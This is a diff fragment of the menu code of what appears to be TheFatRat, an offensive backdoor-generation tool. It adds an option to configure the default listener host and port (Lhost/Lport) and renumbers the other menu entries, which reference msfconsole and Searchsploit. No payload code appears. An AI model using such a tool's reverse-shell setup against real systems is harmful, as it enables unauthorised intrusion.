-   		elif test $fatrat == '14'
+   		elif test $fatrat == '15'
    			then
   			credits
 
-      elif test $fatrat == '15'
+      elif test $fatrat == '16'
         then
           Stop
           echo ""
@@ -3026,10 +3398,11 @@ echo
     echo -e $white"	[$okegreen"09"$white]$okegreen  Jump to msfconsole  "
     echo -e $white"	[$okegreen"10"$white]$okegreen  Searchsploit  "
     echo -e $white"	[$okegreen"11"$white]$okegreen  File Pumper [Increase Your Files Size] "
-    echo -e $white"	[$okegreen"12"$white]$okegreen  Cleanup  "
-    echo -e $white"	[$okegreen"13"$white]$okegreen  Help  "
-    echo -e $white"	[$okegreen"14"$white]$okegreen  Credits  "
-    echo -e $white"	[$okegreen"15"$white]$okegreen  Exit  "
+    echo -e $white"	[$okegreen"12"$white]$okegreen  Configure Default Lhost & Lport "
+    echo -e $white"	[$okegreen"13"$white]$okegreen  Cleanup  "
+    echo -e $white"	[$okegreen"14"$white]$okegreen  Help  "
+    echo -e $white"	[$okegreen"15"$white]$okegreen  Credits  "
+    echo -e $white"	[$okegreen"16"$white]$okegreen  Exit  "
     echo -e " "
     echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"menu$okegreen]:"	
     echo -ne $okegreen" └─────► " ;tput sgr0
@@ -3125,6 +3498,13 @@ echo
       menu
 
     elif test $fatrat == '12'
+      then 
+      echo ""
+      confdefault
+      clear
+      menu
+
+    elif test $fatrat == '13'
       then
       echo ""
       echo -ne $red"  [>] $cyan Are you sure you want to clean payload folders? [y/N] : "
@@ -3168,15 +3548,15 @@ echo
       read anjeng
       menu
 
-    elif test $fatrat == '13'
+    elif test $fatrat == '14'
       then
       firefox https://github.com/Screetsec/TheFatRat/blob/master/README.md
 
-    elif test $fatrat == '14'
+    elif test $fatrat == '15'
       then
       credits
 
-    elif test $fatrat == '15'
+    elif test $fatrat == '16'
       then
         Stop
         echo ""
